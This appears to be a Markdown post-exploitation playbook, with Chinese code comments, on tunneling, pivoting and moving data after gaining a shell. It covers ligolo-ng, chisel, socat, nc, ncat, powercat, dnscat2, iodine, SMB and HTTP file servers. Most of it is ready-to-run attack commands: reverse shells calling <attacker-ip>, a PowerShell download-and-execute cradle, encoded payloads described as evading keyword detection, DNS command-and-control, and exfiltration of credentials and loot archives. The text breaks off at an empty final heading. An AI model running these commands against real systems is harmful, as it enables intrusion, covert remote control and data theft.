# Tunneling, Proxying & Data Transfer

> **When to read this file**: after landing an initial shell and needing to establish a stable C2 tunnel, do intranet traversal / multi-layer pivoting (pivot), break out of firewalls that only allow DNS/ICMP/HTTP egress, put your tools behind a SOCKS proxy, or upload/exfiltrate files between the attacker box and the target.

## Quick Decision Table

| Scenario | Preferred Tool | Alternatives | Key Difference |
|---|---|---|---|
| Linux target + root, want transparent access to the whole intranet | ligolo-ng | chisel(R:socks)+ proxychains4 | ligolo uses TUN with no SOCKS; nmap/browsers work directly; best performance |
| Target can only make outbound TCP (including Windows) | chisel | ligolo-ng | chisel is a single binary, ships a Windows build, and disguises as HTTP |
| Only SSH credentials (no webshell/RCE) | sshuttle | `ssh -D` SOCKS | sshuttle transparently routes all traffic; `-D` provides SOCKS only |
| Toolchain needs to go through SOCKS5 | proxychains4 | proxychains (legacy) | Forces any TCP program through 127.0.0.1:1080 |
| DNS-only egress (full TCP/UDP blockade) | iodine | dns2tcp / dnscat2 | iodine builds a full-IP TUN; dns2tcp does directed TCP forwarding; dnscat2 ships an encrypted C2 command set |
| ICMP (ping) egress only | ptunnel | — | TCP over ICMP echo |
| Egress only through an HTTP(S) proxy | proxytunnel | chisel | proxytunnel is purpose-built for SSH through HTTP CONNECT proxies |
| Upgrade a plaintext shell to encrypted | ncat `--ssl` | sbd / dbd / socat OPENSSL | ncat is the most universal; sbd/dbd have built-in AES and Windows builds |
| Deliver files to a target | goshs / impacket-smbserver | `python3 -m http.server` | SMB needs no client installed on the target; goshs adds upload/WebDAV/auth/HTTPS |
| Exfiltrate data from a target | impacket-smbserver / goshs | raven / nc | SMB is the least hassle on Windows; use goshs TLS when HTTP is monitored |
| 443 is the only usable inbound port | sslh | — | Multiplexes SSH/TLS/OpenVPN on port 443 |
| Both sides behind NAT, no port forwarding | pwnat | — | NAT-to-NAT direct connection via ICMP hole punching |

## First Thing After Getting a Shell: Establish a Stable Tunnel (Decision Tree)

```text
拿到初始 shell(通常是裸 nc/哑 shell,随时会断)
│
├─ 步骤 0:先稳住当前 shell(选一)
│   ├─ 有 python3 : python3 -c 'import pty;pty.spawn("/bin/bash")' → Ctrl-Z → stty raw -echo; fg → export TERM=xterm
│   ├─ 有 socat  : 直接重打 socat 全交互反向 shell(见 socat 条目),一步到位
│   └─ 攻击端用 penelope -p 4444 接收:自动升级 PTY、自动补全、自动记录会话
│
├─ 步骤 1:探测出网能力(按优先级试)
│   curl -s http://<attacker-ip>:8000  →  wget/curl 都试
│   nslookup <domain>                  →  DNS 解析是否可控
│   ping -c 2 <attacker-ip>            →  ICMP 是否放行
│   env | grep -i proxy; cat /etc/resolv.conf
│
├─ 步骤 2:按出网通道选隧道
│   ├─ 可回连任意 TCP  → ligolo-ng(Linux+root 首选)/ chisel(Windows 或要伪装 HTTP 首选)
│   ├─ 仅 SSH 可达     → sshuttle 一条命令透明组网
│   ├─ 仅 HTTP 代理    → proxytunnel / chisel(chisel 流量本身即 HTTP 载荷)
│   ├─ 仅 DNS          → iodine(全 IP)> dns2tcp(TCP 定向)> dnscat2(C2 命令)
│   ├─ 仅 ICMP         → ptunnel
│   └─ 完全不出网      → 正向监听(bind shell/端口转发)+ 从可达跳板访问:socat/ncat/sbd
│
├─ 步骤 3:按目标环境定方案
│   ├─ Linux root(有 /dev/net/tun)→ ligolo-ng agent / iodine / chisel
│   ├─ Linux 低权限     → chisel(client 不需要 root,>1024 端口)/ dns2tcp(客户端免 root)
│   ├─ Windows          → chisel.exe / powercat / sbd.exe / ligolo agent Windows 版
│   └─ 远端只有 Python  → sshuttle(远端只需 python3,无需装任何东西)
│
└─ 步骤 4:隧道就绪后
    ├─ socks 型隧道 → 配 proxychains4 再跑 nmap -sT / curl / 浏览器
    └─ tun 型隧道(ligolo/iodine)→ 直接路由,无需 proxychains
```

## Core Tools in Depth

### ligolo-ng — Modern TUN Reverse Tunnel of Choice (No SOCKS Needed)

**Purpose**: the agent calls back from the target to the proxy over TLS/TCP and creates a TUN interface on the attacker machine, giving access to any TCP/UDP as if directly attached to the intranet; no SOCKS dependency and no proxychains required.
**Installation**: `sudo apt install ligolo-ng` (includes `ligolo-proxy` and `ligolo-agent`; cross-platform prebuilt binaries are in the `ligolo-ng-common-binaries` package)
**Use cases**: the target is Linux root (or a Windows admin), you need to run nmap/browsers/multi-protocol tools, and you value performance and ease of use — prefer it over chisel SOCKS.

```bash
# 1) 攻击机:proxy 生成自签证书并监听(默认 0.0.0.0:11601),记录输出中的 fingerprint
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 2) 目标机:agent 回连(-retry 断线重连,-ignore-cert 跳过证书校验;agent 需 root/TUN)
sudo ligolo-agent -connect <attacker-ip>:11601 -ignore-cert -retry

# 3) 攻击机:创建 TUN 网卡并启用(接口名默认 ligolo)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 4) ligolo-proxy 交互界面:查看 agent 网卡,选一个目标网段中未用的 IP 配到本地
ifconfig                 # 列出 agent 侧接口,如 10.10.10.128/24
ifconfig 240.0.0.1/24    # 给本地 ligolo 接口分配对应网段地址(官方 README 示例)
sudo ip route add 10.10.10.0/24 dev ligolo   # 攻击机加路由,随后可直接访问 10.10.10.0/24

# 5) 端口转发(反向监听):把攻击机 0.0.0.0:8080 经 agent 转到目标可达的 10.10.10.5:80
listener_add --addr 0.0.0.0:8080 --to 10.10.10.5:80 --tcp

# 多 agent 时切换会话
session
```

**Practical tips**:
- Both the proxy side and the agent side must be able to operate TUN (the attacker-side proxy needs `ip tuntap add`, the target-side agent needs root); for low-privilege targets fall back to chisel.
- In real engagements validate certificates on `-connect`: the proxy specifies them with `-cert`/`-key`, and the agent pins the fingerprint with `-fingerprint <sha256>` to prevent man-in-the-middle attacks.
- If the relay is not started, packets will not flow; confirm in the REPL that the agent session is active (check with `session`); the traffic never shows up in the target's process list, only as a single TLS outbound connection.
- Windows targets: use `ligolo-agent.exe` from `ligolo-ng-common-binaries`, same workflow.

### ligolo-mp — Multiplayer ligolo (Auto-managed Multiple TUN + GUI)

**Purpose**: an upgraded client-server architecture of ligolo-ng for several operators working many concurrent tunnels at once, automatically managing all TUN interfaces, with a GUI panel.
**Installation**: `sudo apt install ligolo-mp`
**Use cases**: red-team multi-operator coordination while managing large numbers of agents; for a single box and a single tunnel, ligolo-ng is enough.

```bash
# 服务端:agent 监听地址默认 0.0.0.0:11601;-insecure-agents 跳过 agent 证书校验(测试用)
sudo ligolo-mp -agent-addr 0.0.0.0:11601 -insecure-agents
# 守护模式
ligolo-mp -daemon

# 操作端:客户端连到 ligolo-mp 服务端查看/控制隧道(多人可同时接入)
ligolo-mp-client
```

**Practical tips**:
- `-max-connection` (default 1024) and `-max-inflight` control the per-tunnel connection pool; raise them as needed for heavy concurrent scanning.
- The agent side behaves exactly like ligolo-ng: the agent still connects back to the entrance specified by `-agent-addr`.

### chisel — De-facto Standard Reverse Tunnel (HTTP Carrier + SSH Encryption, Single Binary)

**Purpose**: a single static binary containing both server and client; wraps TCP/UDP tunnels inside HTTP encrypted with SSH, purpose-built to pierce firewalls; the target only needs to reach one port on the attacker box.
**Installation**: `sudo apt install chisel` (preinstalled on Kali; for cross-platform prebuilt versions install `chisel-common-binaries` and use `dpkg -L chisel-common-binaries` to locate the Windows .exe and others)
**Use cases**: the target is Windows or a low-privilege Linux user, you need SOCKS or directed port mapping, or you want traffic disguised as HTTP.

```bash
# ===== 完整反向隧道流程 =====
# 1) 攻击机(server):监听 8000,允许客户端注册反向隧道(-reverse),加认证
sudo chisel server -p 8000 -reverse --auth <user>:<pass>

# 2) 目标机(client):把 chisel 二进制传上去(见 goshs/smbserver),回连并注册反向 SOCKS
./chisel client <attacker-ip>:8000 R:socks --auth <user>:<pass>
#    攻击机随后获得 127.0.0.1:1080 SOCKS5 入口,配 proxychains4 使用

# 3) 定向反向端口映射:攻击机 3389 → (经目标) 10.0.0.5:3389
./chisel client <attacker-ip>:8000 R:3389:10.0.0.5:3389 --auth <user>:<pass>
#    然后攻击机直接:xfreerdp /v:127.0.0.1:3389

# 4) UDP 也支持(加 /udp 后缀):经目标访问内网 DNS
./chisel client <attacker-ip>:8000 R:5353:10.0.0.53:53/udp --auth <user>:<pass>

# ===== 其他常用形态 =====
# 客户端本地转发:目标机本地 3000 → 经攻击机 → google.com:80(目标出网、攻击机受限时反向用)
./chisel client <attacker-ip>:8000 3000:google.com:80

# 服务端直接提供 SOCKS5(多客户端出口代理)
sudo chisel server -p 8000 --socks5

# 排障必开详细日志(两侧都加)
./chisel client -v <attacker-ip>:8000 R:socks
```

**Practical tips**:
- The `R:` prefix = open the listener on the server (attacker) side with traffic exiting via the client; without `R:` the listener opens on the client side. Getting the direction backwards is the most common mistake.
- Without `-reverse` on the server, client `R:` tunnels are rejected (older versions default it off — always add it explicitly).
- On Windows targets use `chisel.exe` (chisel-common-binaries package or GitHub Releases) with identical commands; after transfer, verify integrity with `certutil -hashfile` first.
- `R:socks` listens on server port 1080 by default; if that is taken, change the port with `R:1081:socks`.

### sshuttle — Transparent "Poor Man's VPN" (Full Traffic Routing over SSH)

**Purpose**: uses iptables locally to transparently forward traffic for the specified subnets into an SSH tunnel; the remote end only needs python3 — nothing to install server-side.
**Installation**: `sudo apt install sshuttle` (preinstalled on Kali)
**Use cases**: you have the target's SSH credentials (root or sudo-capable) and want one command that lets every local tool (nmap/curl/RDP clients) reach the target's intranet directly, instead of configuring proxies one by one.

```bash
# 基本用法:把目标可达的 10.10.10.0/24 路由到本地(需本地 root)
sudo sshuttle -r <user>@<target-ip> 10.10.10.0/24

# 路由目标全部流量(默认路由,慎用,会把 SSH 自身也绕进去需自动排除)
sudo sshuttle -r <user>@<target-ip> 0.0.0.0/0

# 排除特定地址(-x):如排除目标自身与 VPN 网段
sudo sshuttle -r <user>@<target-ip> 10.10.10.0/24 -x 10.10.10.5

# 指定端口与私钥
sudo sshuttle -r <user>@<target-ip>:22 --ssh-cmd "ssh -i <keyfile>" 10.10.10.0/24

# DNS 也走隧道
sudo sshuttle --dns -r <user>@<target-ip> 10.10.10.0/24
```

**Practical tips**:
- Only TCP forwarding works (newer versions can support UDP with `--method tproxy`; `-t/--tmark` is only for custom tproxy traffic marks), and ICMP is unaffected: failed intranet pings do not mean the tunnel is broken — verify with `nmap -sT`.
- The remote end must be Linux/Unix with python3; not usable against Windows targets (use chisel/ligolo there).
- When you only need SOCKS rather than transparent routing, plain SSH is enough: `ssh -D 1080 <user>@<target>` (SOCKS5); single-port forwarding with `ssh -L 8080:10.0.0.5:80 ...`, reverse with `ssh -R 9001:10.0.0.5:3389 ...`.
- `fatal: bad remote` usually means the remote python is not in PATH; if adding `--remote` does not fix it, set `--python <path>` explicitly.

### proxychains4 — Shoehorn Any TCP Program Into a SOCKS Proxy

**Purpose**: hijacks network calls via LD_PRELOAD, forcing dynamically linked TCP programs out through a SOCKS4/5 (or HTTP) proxy; the standard companion to chisel `R:socks`, `ssh -D`, and ligolo socks mode.
**Installation**: `sudo apt install proxychains4` (preinstalled on Kali)
**Use cases**: the tunnel exposes a SOCKS entry (127.0.0.1:1080) but the tool itself supports no proxy options.

```bash
# 配置代理出口(编辑末尾 proxylist 段;默认 chain 模式为 strict)
sudo nano /etc/proxychains4.conf
#   [ProxyList]
#   socks5 127.0.0.1 1080

# 常规用法:命令前加前缀
proxychains4 curl http://10.10.10.5/
proxychains4 nmap -sT -Pn -n 10.10.10.0/24 -p 22,80,443,3389
proxychains4 ssh <user>@10.10.10.5

# 避免输出刷屏,配置里打开 quiet_mode;或用 shell 包装
```

**Practical tips**:
- Only works for TCP + dynamically linked programs: nmap must use `-sT` (full connect) with OS detection disabled — the raw sockets of a SYN scan (`-sS`) bypass the proxy and send packets directly; statically linked binaries are unaffected.
- DNS goes through the proxy via proxy_dns by default; if it may still leak, prefer direct-IP usage in the target tools (`-n`, `--resolve`-style flags).
- Chained proxies: list several entries in order in proxylist and you get a proxy chain (strict mode walks them all in order).
- Proxying a whole GUI/browser window: `proxychains4 firefox` is common for browser-based exploitation of historical vulnerabilities and intranet web hunting.

### socat — Bidirectional Stream Relay, Swiss Army Knife (Forwarding/Encryption/Fully Interactive Shell)

**Purpose**: builds a bidirectional byte pipe between any two "addresses" (TCP/UDP/SSL/EXEC/FILE/PTY...); a netcat superset that handles port forwarding, encrypted shells, TTY callback shells, and file transfers.
**Installation**: `sudo apt install socat` (preinstalled on Kali)
**Use cases**: when you need finer control than nc: concurrent fork, TLS, PTY, cross-protocol bridging (TCP↔UDP↔Unix socket↔serial).

```bash
# ===== 全交互反向 shell(一步到 PTY,免 python 升级)=====
# 攻击机:监听并把当前 tty 接上去
socat file:`tty`,raw,echo=0 TCP-LISTEN:443,reuseaddr
# 目标机:回连并执行 bash(pty 分配伪终端)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<attacker-ip>:443

# ===== 加密(TLS)反向 shell =====
# 攻击机:生成自签证书(一次性)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes
# 攻击机:TLS 监听
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork -
# 目标机:TLS 回连并执行 shell
socat OPENSSL:<attacker-ip>:443,verify=0 EXEC:/bin/bash

# ===== bind shell(正向)=====
# 目标机:监听并执行
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
# 攻击机:连接
socat - TCP:<target-ip>:4444

# ===== 端口转发/中继 =====
# 本机 8080 → 内网 10.0.0.5:80(fork 支持并发,reuseaddr 防端口残留)
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.0.5:80
# TCP ↔ UDP 桥接:本机 TCP 5353 → UDP DNS
socat TCP-LISTEN:5353,fork,reuseaddr UDP:10.0.0.53:53

# ===== 文件传输 =====
# 接收端(攻击机):监听并落盘(creat 不存在则建,trunc 清空)
socat TCP-LISTEN:4444,reuseaddr OPEN:<file>,creat,trunc
# 发送端(目标机):
socat FILE:<file> TCP:<attacker-ip>:4444
```

**Practical tips**:
- Targets whose reverse shell cannot use `EXEC` (e.g. embedded devices) can use `SYSTEM:'sh'` instead; `fork` lets a listener accept connections repeatedly — do not add it for one-shot transfers.
- `OPENSSL-LISTEN` requires `cert=` + `key=`, and the client skips verification with `verify=0`; in production add `cafile=` for mutual validation.
- Debugging trio: `-d -d` verbose logs, `-v` to print the data stream (you can watch the plaintext shell interaction), and `reuseaddr` to clear TIME_WAIT port holds.
- socat can also wrap TLS around legacy plaintext-only services (see stunnel), or bridge a Unix socket to TCP for remote debugging.

### netcat(nc)— The Most Basic Listen/Connect/File-Transfer Tool

**Purpose**: the TCP/UDP read/write primitive; reverse-shell receiver, file transfer, banner grabbing, ad-hoc port listening; the baseline that every "second choice" tool is measured against.
**Installation**: `sudo apt install netcat-traditional` (Kali's default `nc` is the OpenBSD variant; the traditional binary is `nc.traditional`)
**Use cases**: quick one-off listening/connecting that works in any environment; nc exists on nearly every Linux.

```bash
# ===== 反向 shell 接收端(最常用)=====
nc -lvnp 4444

# ===== 目标端反弹(OpenBSD nc 无 -e,用 fifo 法,任何 nc 通用)=====
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f

# ===== bind shell(需要 -e:传统版/GNU 版支持)=====
nc.traditional -l -p 4444 -e /bin/bash     # 目标机
nc -nv <target-ip> 4444                    # 攻击机连接

# ===== 文件传输 =====
nc -lvnp 4444 > <file>                     # 接收端
nc -nv <attacker-ip> 4444 < <file>         # 发送端,传完 Ctrl-C

# ===== banner 抓取/端口连通性 =====
nc -nv <target-ip> 22
```

**Practical tips**:
- Kali's default `nc` (OpenBSD) has no `-e`; for `-e` use `nc.traditional`, or switch to ncat/socat.
- `nc` listening is one-shot: it exits on disconnect; for a persistent listener add `-k` (OpenBSD) or switch to socat `fork`.
- Upgrade a reverse shell to a PTY immediately (see decision tree step 0), or Ctrl-C/su/ssh interaction will all misbehave.
- Raw nc traffic is fully plaintext; in IDS-sensitive environments switch to ncat `--ssl`/sbd/socat TLS.

### ncat — netcat from the Nmap Project (SSL + Access Control + Persistent Listening)

**Purpose**: a modern reimplementation of netcat: native `--ssl` encryption, `--allow/--deny` source control, `--keep-open` persistent listening, IPv6.
**Installation**: `sudo apt install ncat` (preinstalled on Kali, part of the nmap suite)
**Use cases**: when you need an encrypted channel or want to restrict who can reach the shell; a no-brainer wherever the nmap suite is already present.

```bash
# 官网示例:bind shell,仅允许指定 IP,断开保持监听
ncat -v --exec "/bin/bash" --allow <allowed-ip> -l 4444 --keep-open

# ===== 加密 bind shell =====
ncat -lvnp 4444 --exec /bin/bash --ssl      # 目标机
ncat -v --ssl <target-ip> 4444              # 攻击机连接

# ===== 加密反向 shell =====
ncat -lvnp 4444 --ssl                       # 攻击机监听
ncat --exec /bin/bash --ssl <attacker-ip> 4444   # 目标机回连

# ===== 加密文件通道 =====
ncat -l 4444 --ssl > <file>                 # 接收端
ncat --ssl <attacker-ip> 4444 < <file>      # 发送端
```

**Practical tips**:
- Add `--ssl` on both ends; enabling it on one end only fails the handshake (symptom: connects, then drops immediately).
- `--allow <ip>` (comma-separated multiples/CIDR) shrinks the shell's exposure down to just you; `--keep-open` + `fork` behaves like a persistent service.
- Windows has ncat.exe, the easiest encrypted Windows shell: `ncat.exe --exec cmd.exe --ssl <ip> <port>`.
- The port-scanning feature was removed — scan with nmap; ncat focuses on connect/listen/relay.

### penelope — Modern Shell Handler (an "nc Replacement" That Auto-Upgrades the PTY)

**Purpose**: listens for / connects to reverse shells and stabilizes them automatically: automatic PTY upgrade, readline completion, session logging, automatic re-listening on disconnect, multi-session management, plus a file-serving mode.
**Installation**: `sudo apt install penelope`
**Use cases**: the default receiver for shells on the attacker side — skips the manual `python pty.spawn` + `stty raw` routine, and sessions can be enumerated/switched.

```bash
# 监听反弹 shell(接收即自动升级为可交互 shell)
penelope -p 4444

# 作为客户端连接(nc 风格交互)
penelope -c <target-ip> -p <port>

# 提供文件下载服务(serve 模式)
penelope -s <file>

# 多端口同时监听(逗号分隔)
penelope -p 4444,4445,8080
```

**Practical tips**:
- Sessions are logged to disk automatically for direct citation in reports/forensics; `-v/-d/-dd` raise output and debug levels.
- Compatible with every reverse payload (nc/socat/bash one-liners are all handled); the target side needs no cooperation.
- When catching multiple shells, switch via the session list instead of opening more terminal windows.

### goshs — SimpleHTTPServer on Steroids (Upload/WebDAV/Auth/TLS All-in-One)

**Purpose**: a single-file HTTP service written in Go: directory browsing + download, optional upload, WebDAV, Basic auth, TLS — a pentest-specialized replacement for `python3 -m http.server`.
**Installation**: `sudo apt install goshs`
**Use cases**: pushing tools/payloads to a target, or when the target must upload files back to exfiltrate data (first choice when SMB is blocked).

```bash
# 基础:在指定目录起 HTTP(默认 0.0.0.0:8000)
sudo goshs -i 0.0.0.0 -p 8000 -d /tmp/share

# 上传默认可用(浏览器页面拖拽上传);只收文件可加 -uo(upload-only)并配 -uf <dir> 指定上传目录
goshs -p 8000 -d /tmp/exfil

# 同时开 WebDAV(Windows 可映射网络驱动器)
goshs -p 8000 -w -wp 8080

# Basic 认证 + TLS(pkcs12 证书)
goshs -s -p12 <cert.p12> -p 443 -d /tmp/share -b <user>:<pass>

# 目标侧下载
wget http://<attacker-ip>:8000/<file>
curl -o <file> http://<attacker-ip>:8000/<file>
```

**Practical tips**:
- The WebDAV listener sits on the port given by `-wp`; on a Windows target `net use * http://<attacker-ip>:8080/` mounts it like a drive letter for drag-and-drop; on the Linux side use cadaver.
- Anonymous HTTP transfers are trivially flagged by situational-awareness tooling; add `-s` TLS and `-b` auth in sensitive contexts.
- The upload page is the fastest way to exfiltrate hashes/credentials/small files — no SMB, no share permissions.

### impacket-smbserver — Start an SMB Share in One Line (Top Choice for Windows Exfil/Delivery)

**Purpose**: an instant anonymous/authenticated SMB share; Windows targets can download (`copy \\ip\share\...`) or exfiltrate files with zero third-party tooling.
**Installation**: `sudo apt install impacket-scripts` (preinstalled on Kali)
**Use cases**: the target is Windows and SMB (445) is reachable; when SMB1 is disabled you must add `-smb2support`.

```bash
# 匿名共享(SMB1,老系统)
sudo impacket-smbserver share /tmp/share

# 现代 Windows(SMB2)+ 账号认证
sudo impacket-smbserver -smb2support -user <user> -password <pass> share /tmp/share

# 目标机(Windows)——下载
copy \\<attacker-ip>\share\<file> C:\Temp\
# 目标机(Windows)——回传
net use \\<attacker-ip>\share /user:<user> <pass>
copy C:\Temp\loot.zip \\<attacker-ip>\share\
```

**Practical tips**:
- Without `-smb2support`, Win10/11 fails because SMB1 is disabled — the single most frequent pitfall.
- Windows event logs record access to the share; in authorized tests this doubles as a way to check detection coverage; anonymous SMB1 trips alerts even more easily.
- If 445 is blocked at the perimeter firewall, fall back to goshs (HTTP/WebDAV) or relay inside a chisel tunnel.
- Related siblings: `impacket-smbexec`/`impacket-wmiexec` execute commands, `impacket-secretsdump` dumps credentials (see the lateral movement reference).

### dnscat2 — Encrypted C2 over DNS (Built-in Commands and File Transfer)

**Purpose**: establishes an encrypted C&C channel over the DNS protocol: interactive shell, upload/download, port forwarding — works out of nearly any network that allows recursive resolution.
**Installation**: `sudo apt install dnscat2` (the server is `dnscat2-server`, the client is in `dnscat2-client`)
**Use cases**: DNS-only egress where you need "a C2 with a command set" (not just a pipe); also used to validate DNS egress monitoring.

```bash
# ===== 服务端(攻击机,需在 <domain> 的权威 NS 上,或客户端直连模式)=====
sudo dnscat2-server <domain>

# ===== 客户端(目标机)=====
# 走递归 DNS(需 NS 记录把 <domain> 委派到攻击机)
dnscat2 <domain>
# 直连模式(目标能直接 UDP 53 到攻击机,不经递归)
dnscat2 --dns server=<attacker-ip>,port=53 --secret=<key>

# ===== 服务端控制台 =====
windows              # 列出会话
window -i 1          # 进入 1 号命令会话(得到目标 shell)
listen 127.0.0.1:9001 10.10.10.5:22   # 服务端本地 9001 → 目标可达的 22
upload <file>; download <file>
```

**Practical tips**:
- At startup the server prints a `--secret` per domain; direct-connect clients must pass the same secret, or the session will not establish.
- Recursive mode needs a real delegated domain (NS record pointing at the attacker); without a domain, only direct mode works.
- Bandwidth is extremely low (tens of bytes per query): fine for commands/small files, not for hauling databases.
- TXT-record traffic has an obvious signature and always shows in blue-team DNS logs (grep `<domain>`); red teams use it precisely to validate such monitoring.

### iodine — IPv4 over DNS (Full-Featured IP Tunnel)

**Purpose**: encapsulates complete IPv4 traffic inside DNS and builds a TUN point-to-point tunnel; any protocol runs on top of it (SSH/proxies/direct tool access), making it one of the highest-throughput DNS tunneling options.
**Installation**: `sudo apt install iodine` (`iodined` server + `iodine` client)
**Use cases**: DNS-only egress where you need "whole-network IP reachability" rather than a single TCP stream; more capable than dns2tcp but also more demanding to set up (needs an authoritative domain).

```bash
# ===== 服务端(攻击机,须是 <tunnel-domain> 的权威 NS;监听 53 需 root)=====
sudo iodined -f -P <password> 10.0.0.1 <tunnel-domain>
#   10.0.0.1 = 服务端隧道 IP(客户端会拿到 10.0.0.2),-f 前台运行便于观察

# ===== 客户端(目标机)=====
# 经系统递归 DNS(需 NS 委派)
sudo iodine -f -P <password> <tunnel-domain>
# 指定 DNS 服务器直连(绕过递归,连通性差时用;-r 强制纯 DNS 编码模式)
sudo iodine -f -r -P <password> <attacker-ip> <tunnel-domain>

# ===== 隧道就绪后(两侧各得 tun 接口 10.0.0.1/10.0.0.2)=====
ssh <user>@10.0.0.2          # 从攻击机 SSH 进目标(配合目标上反连或正向 SSH)
ssh -D 1080 <user>@10.0.0.2  # 再叠一层 SOCKS,内网工具全走隧道
```

**Practical tips**:
- Heaviest prerequisites: a delegatable domain (NS record pointing at the attacker IP); otherwise you can only test with server and client on the same side.
- The client tries raw UDP mode first (fast) and automatically degrades to DNS encoding once the firewall drops packets; force the degradation with `-r`.
- Throughput depends on the recursive resolver's cache and supported record types; dropping to a few KB/s in hostile environments is normal — move large transfers to a dns2tcp directed channel or chunk them.
- After stopping, check for leftover tun with `ip addr`; on the target side, log review focuses on `/etc/resolv.conf` pointing and high-frequency TXT/NULL queries.

### dns2tcp — TCP-over-DNS Directed Tunnel (Root-free Client)

**Purpose**: wraps designated TCP resources (e.g. SSH) inside DNS; packets are smaller than IP-over-DNS with better throughput; the client needs no root.
**Installation**: `sudo apt install dns2tcp` (includes the `dns2tcpd` server and the `dns2tcpc` client)
**Use cases**: DNS-only egress where you only need to pull out individual TCP services (SSH/SOCKS); lighter than iodine and more of a plain pipe than dnscat2 (no built-in command set).

```bash
# ===== 服务端(攻击机)===== 官网示例配置
cat >> .dns2tcpdrc <<END
listen = 0.0.0.0
port = 53
user = nobody
chroot = /root/dns2tcp
pid_file = /var/run/dns2tcp.pid
domain = <tunnel-domain>
key = <secretkey>
resources = ssh:127.0.0.1:22
END
sudo dns2tcpd -f .dns2tcpdrc
# resources 可写多条:resources = ssh:127.0.0.1:22,socks:127.0.0.1:1080

# ===== 客户端(目标机,无需 root)=====
cat >> .dns2tcprc <<END
domain = <tunnel-domain>
resource = ssh
local_port = 2139
key = <secretkey>
END
dns2tcpc -f .dns2tcprc
# 本地 2139 即攻击机 SSH,再叠 SOCKS 出内网
ssh <user>@localhost -p 2139 -D 8090
```

**Practical tips**:
- Like iodine it needs NS delegation; the client initiates from inside the network, and `local_port` is the plaintext entry it opens on the target side.
- One `resource` at a time — edit the config and restart to switch; for multiple resources, list them all in the server's `resources` and switch on the client.
- The root-free client is its core advantage over iodine (usable from a low-privilege shell).

### stunnel4 — Universal Wrapper That Puts TLS Around Any Plaintext Service

**Purpose**: bridges an SSL/TLS channel between non-SSL services and clients; with `exec=` you can also hang a shell directly behind a TLS port, producing an encrypted bind shell.
**Installation**: `sudo apt install stunnel4`
**Use cases**: plaintext shells/services (nc shell, internal HTTP, databases) that must cross an encrypted link, or disguising in environments where only 443/SSL is allowed.

```bash
# 生成自签证书(一次性)
sudo openssl req -x509 -newkey rsa:2048 -keyout /etc/stunnel/stunnel.pem \
  -out /etc/stunnel/stunnel.pem -days 30 -nodes

# ===== 服务端(攻击机):TLS 端口直接挂 bash =====
sudo tee /etc/stunnel/shell.conf <<END
cert = /etc/stunnel/stunnel.pem
[shell]
accept = 0.0.0.0:443
exec = /bin/bash
execArgs = /bin/bash -i
END
sudo stunnel4 /etc/stunnel/shell.conf

# ===== 客户端(攻击机另一台/目标机):把远端 TLS 映射为本地明文端口 =====
sudo tee stunnel-client.conf <<END
client = yes
[shell]
accept = 127.0.0.1:9000
connect = <target-ip>:443
END
sudo stunnel4 stunnel-client.conf
nc 127.0.0.1 9000          # 像连明文 shell 一样使用

# ===== 典型加密中继:把内网明文服务经 stunnel 引到本地 =====
# client = yes;accept = 127.0.0.1:5432;connect = <db-host>:5432(两端各跑一个 stunnel)
```

**Practical tips**:
- The server must have `cert=`; `client = yes` may appear on one end only — writing the direction backwards fails the handshake outright.
- For debugging, add `foreground = yes` and `output = /tmp/stunnel.log` to the config section.
- stunnel is an "encryption mover" and does no authentication; for shells pair it with a firewall allowlist or sslh port multiplexing.
- On Debian/Kali the package name, binary, and systemd unit all carry the 4 suffix: binary `stunnel4`, service `stunnel4.service` (`sudo systemctl start stunnel4`).

### powercat — PowerShell netcat (Fileless Channel for Windows)

**Purpose**: a PowerShell implementation of netcat: bind/reverse shells, file transfer, TLS, a DNS tunnel mode, and payload-string generation — no third-party exe needed on Windows targets.
**Installation**: `sudo apt install powercat` (the script itself: `/usr/share/windows-resources/powercat/powercat.ps1`)
**Use cases**: Windows targets where only PowerShell is available and you do not want to drop nc.exe.

```bash
# ===== 反向 shell(攻击机先 nc -lvnp 4444;目标 PowerShell 远程加载执行)=====
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker-ip>:8000/powercat.ps1');powercat -c <attacker-ip> -p 4444 -e cmd"

# ===== bind shell =====
powercat -l -p 4444 -e cmd
nc -nv <target-ip> 4444

# ===== 加密(TLS)反向 shell =====
powercat -c <attacker-ip> -p 4444 -e cmd -tls
powercat -l -p 4444 -tls

# ===== DNS 模式(配合 dnscat2 服务端,域名走 DNS 出网)=====
powercat -c <attacker-ip> -p 53 -dns <domain> -e cmd

# ===== 生成 payload(免二次下载)=====
powercat -l -p 8000 -e cmd -g > rev.ps1      # 生成脚本文件
powercat -c <ip> -p 4444 -e cmd -ge          # 生成 base64 编码 payload
```

**Practical tips**:
- `-ge` generates an encoded payload; run it with `powershell -enc <base64>` to bypass naive keyword detection.
- The DNS mode is protocol-compatible with dnscat2; catch it on the attacker side with `dnscat2-server <domain>`.
- The remote-load path can also be served by goshs; in air-gapped environments write powercat.ps1 to the target first, then `IEX(Get-Content ...)`.

### sbd — Encrypted netcat (AES-128, Cross-platform Linux/Windows)

**Purpose**: a netcat clone with built-in AES-CBC-128 + HMAC-SHA1 encryption, `-e` program execution, and reconnect on drop; ships a Windows build.
**Installation**: `sudo apt install sbd`
**Use cases**: both ends can run a standalone binary and you want encryption without certificate setup (ncat/socat TLS need certs; sbd is zero-config).

```bash
# 官网示例:攻击端监听 4444 并执行 bash(-n 不做解析,-v 详细输出)
sbd -l -p 4444 -e bash -v -n
# 目标端连接
sbd <attacker-ip> 4444

# 反向用法(目标机执行 shell 回连攻击端监听)
sbd -l -p 4444 -v -n                       # 攻击端裸监听
sbd -e /bin/bash <attacker-ip> 4444        # 目标端
```

**Practical tips**:
- Same lineage and positioning as dbd, with compatible parameters; install either one, and pick the matching .exe for Windows drops.
- The encryption is built in but offers no certificate/fingerprint validation — it defends against link eavesdropping, not man-in-the-middle.

### dbd — Encrypted netcat Clone (with Daemon/Scheduled Reconnect)

